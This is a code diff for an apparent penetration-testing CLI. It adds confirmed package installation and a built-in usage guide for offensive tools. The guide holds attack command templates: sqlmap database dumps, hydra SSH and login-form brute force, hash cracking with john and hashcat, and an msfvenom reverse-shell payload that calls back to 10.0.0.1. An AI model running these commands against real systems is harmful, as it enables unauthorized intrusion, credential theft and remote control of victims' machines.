@@ -940,7 +940,7 @@ Focus on technical accuracy and completeness. Students learn best from detailed,
             return f"❌ Invalid choice!"
     
     def install_single_tool(self, tool_name: str):
-        """Install a single tool with progress bar"""
+        """Install a single tool and show usage commands"""
         tool_info = self.command_helper.hexstrike_tools.get(tool_name)
         if not tool_info:
             return f"❌ Unknown tool: {tool_name}"
@@ -950,30 +950,111 @@ Focus on technical accuracy and completeness. Students learn best from detailed,
             info_text = f"""[bold cyan]Tool:[/bold cyan] {tool_name}
 [bold cyan]Name:[/bold cyan] {tool_info['name']}
 [bold cyan]Category:[/bold cyan] {tool_info['category']}
-[bold cyan]Description:[/bold cyan] {tool_info['desc']}
-
-[bold yellow]Installation Command:[/bold yellow]
-[green]sudo apt install {tool_name}[/green]"""
+[bold cyan]Description:[/bold cyan] {tool_info['desc']}"""
             
             console.print("\n")
             console.print(Panel(info_text, title="[bold yellow]📦 Tool Installation[/bold yellow]", 
                               border_style="cyan", expand=False))
-            
-            # Show installation command with syntax highlighting
-            code = f"sudo apt install {tool_name}"
-            syntax = Syntax(code, "bash", theme="monokai", line_numbers=False)
-            console.print("\n[bold yellow]💡 Copy and run this command:[/bold yellow]")
-            console.print(syntax)
-            console.print()
-            
         else:
-            # Fallback without rich
             print(f"\n📦 Installing {tool_info['name']}...")
-            print(f"🔧 Command: sudo apt install {tool_name}")
             print(f"📋 Category: {tool_info['category']}")
             print(f"📝 Description: {tool_info['desc']}")
         
-        return f"📦 Run 'sudo apt install {tool_name}' to install {tool_info['name']}!"
+        # Ask for confirmation
+        confirm = input(f"\n{self._colorize('🔧 Install ' + tool_name + '? (yes/no):', Fore.YELLOW)} ").strip().lower()
+        
+        if confirm in ['yes', 'y']:
+            print(f"\n{self._colorize('🚀 Installing ' + tool_name + '...', Fore.GREEN)}")
+            
+            # Run installation command
+            try:
+                result = subprocess.run(['sudo', 'apt', 'install', '-y', tool_name], 
+                                      capture_output=False, text=True)
+                
+                if result.returncode == 0:
+                    print(f"\n{self._colorize('✅ Successfully installed ' + tool_name + '!', Fore.GREEN)}")
+                    
+                    # Show usage commands
+                    self.show_tool_usage(tool_name, tool_info)
+                    return f"✅ {tool_name} installed and ready to use!"
+                else:
+                    return f"❌ Installation failed. Try manually: sudo apt install {tool_name}"
+            except Exception as e:
+                return f"❌ Error during installation: {e}"
+        else:
+            return "❌ Installation cancelled"
+    
+    def show_tool_usage(self, tool_name: str, tool_info: dict):
+        """Show tool usage examples and commands"""
+        if RICH_AVAILABLE:
+            console.print("\n")
+            console.print(Panel("[bold green]✅ Installation Complete![/bold green]", 
+                              border_style="green", expand=False))
+        
+        print(f"\n{self._colorize('🎯 TOOL USAGE GUIDE', Fore.YELLOW)}")
+        print(self._colorize('=' * 70, Fore.CYAN))
+        
+        # Get usage examples for common tools
+        usage_examples = self.get_tool_usage_examples(tool_name)
+        
+        print(f"\n{self._colorize('💡 Quick Start Commands:', Fore.GREEN)}")
+        for i, (cmd, desc) in enumerate(usage_examples, 1):
+            if RICH_AVAILABLE:
+                syntax = Syntax(cmd, "bash", theme="monokai", line_numbers=False)
+                console.print(f"\n[bold cyan]{i}. {desc}[/bold cyan]")
+                console.print(syntax)
+            else:
+                print(f"\n{i}. {desc}")
+                print(f"   {cmd}")
+        
+        print(f"\n{self._colorize('💡 TIP:', Fore.YELLOW)} Type /{tool_name} to access these commands quickly!")
+        print(f"{self._colorize('📖 Help:', Fore.CYAN)} Run '{tool_name} --help' for full documentation\n")
+    
+    def get_tool_usage_examples(self, tool_name: str):
+        """Get usage examples for specific tools"""
+        examples = {
+            'nmap': [
+                ('nmap -sn 192.168.1.0/24', 'Ping scan - discover live hosts'),
+                ('nmap -sS -p- target.com', 'SYN scan all ports'),
+                ('nmap -sV -sC target.com', 'Service version detection with default scripts'),
+                ('nmap -A target.com', 'Aggressive scan (OS, version, scripts, traceroute)'),
+            ],
+            'sqlmap': [
+                ('sqlmap -u "http://target.com/page?id=1" --dbs', 'List databases'),
+                ('sqlmap -u "http://target.com/page?id=1" -D dbname --tables', 'List tables'),
+                ('sqlmap -u "http://target.com/page?id=1" --batch --dump', 'Auto dump data'),
+            ],
+            'hydra': [
+                ('hydra -l admin -P passwords.txt ssh://target.com', 'SSH brute force'),
+                ('hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"', 'Web form brute force'),
+            ],
+            'nikto': [
+                ('nikto -h http://target.com', 'Basic web server scan'),
+                ('nikto -h http://target.com -p 80,443,8080', 'Scan multiple ports'),
+            ],
+            'gobuster': [
+                ('gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt', 'Directory brute force'),
+                ('gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt', 'Subdomain enumeration'),
+            ],
+            'john': [
+                ('john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', 'Crack password hashes'),
+                ('john --show hashes.txt', 'Show cracked passwords'),
+            ],
+            'hashcat': [
+                ('hashcat -m 0 -a 0 hashes.txt wordlist.txt', 'MD5 dictionary attack'),
+                ('hashcat -m 1000 -a 0 hashes.txt wordlist.txt', 'NTLM dictionary attack'),
+            ],
+            'metasploit': [
+                ('msfconsole', 'Start Metasploit console'),
+                ('msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe', 'Generate Windows payload'),
+            ],
+        }
+        
+        # Return tool-specific examples or generic ones
+        return examples.get(tool_name, [
+            (f'{tool_name} --help', 'Show help and available options'),
+            (f'{tool_name} target', 'Basic usage against target'),
+        ])
     
     def show_installation_status(self):
         """Show detailed installation status"""
@@ -1215,6 +1296,23 @@ Focus on technical accuracy and completeness. Students learn best from detailed,
             return "🧹 Screen cleared."
         elif cmd == "status":
             return self.get_status()
+        
+        # Check if it's a tool command (e.g., /nmap, /sqlmap)
+        if cmd in self.command_helper.hexstrike_tools:
+            tool_info = self.command_helper.hexstrike_tools[cmd]
+            
+            # Check if tool is installed
+            if self.check_tool_installed(cmd):
+                self.show_tool_usage(cmd, tool_info)
+                return ""
+            else:
+                print(f"\n{self._colorize('⚠️  ' + cmd + ' is not installed yet!', Fore.YELLOW)}")
+                confirm = input(f"{self._colorize('Install now? (yes/no):', Fore.YELLOW)} ").strip().lower()
+                if confirm in ['yes', 'y']:
+                    return self.install_single_tool(cmd)
+                else:
+                    return f"💡 Install {cmd} from menu option 2 (Hacking Toys)"
+        
         elif cmd == "scan":
             return "🔍 Usage: scan <target> - Perform security scan on target"
         elif cmd == "payload":
